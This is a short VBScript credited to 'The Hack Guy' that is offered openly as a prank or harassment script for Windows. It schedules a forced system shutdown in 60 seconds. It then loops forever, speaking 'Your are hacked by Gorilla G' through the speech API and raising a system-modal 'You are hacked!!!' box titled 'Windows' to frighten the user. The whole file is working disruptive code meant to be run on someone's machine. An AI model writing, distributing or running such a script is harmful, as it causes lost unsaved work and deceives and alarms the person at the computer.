'By The Hack Guy
'running this will shutdown windows in 1 min with loop message
set  shell= CreateObject("Wscript.Shell") 
shell.run"shutdown.exe -s -t 60" 'change 60s to your desired time...
do
strtext="Your are hacked by Gorilla G"
set objvoice=createobject("sapi.spvoice")
objvoice.rate=-2
objvoice.speak strtext
TheHackGuy=msgbox("You are hacked!!!",0+16+4096,"Windows")
Loop
'By The Hack Guy